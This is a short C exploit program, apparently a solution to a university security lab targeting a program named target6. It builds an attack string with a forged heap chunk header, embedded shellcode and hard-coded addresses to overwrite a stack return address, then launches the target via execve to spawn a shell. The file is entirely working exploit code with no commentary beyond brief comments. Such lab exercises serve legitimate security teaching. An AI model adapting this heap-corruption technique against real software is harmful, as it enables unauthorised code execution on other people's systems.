#include "shellcode-64.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "../targets/target6"

int main(void) {
  // Initialize the attack string.
  char attack[81] = {};
  memset(attack, '!', sizeof(attack) - 1);

  // Malicious chunk header: jmp rel8 into the shell code.
  *(short *)attack = 0x06EB;

  // Shell code.
  memcpy(&attack[8], shellcode, sizeof(shellcode) - 1);

  // q's chunk header.
  *(int *)(attack + 72) = 0x0104EC48; // Address of the malicious chunk header
  *(int *)(attack + 76) = 0x3021FEA8; // Stack memory storing the return address

  char *args[3] = {TARGET, attack, NULL};
  char *env[1] = {NULL};

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
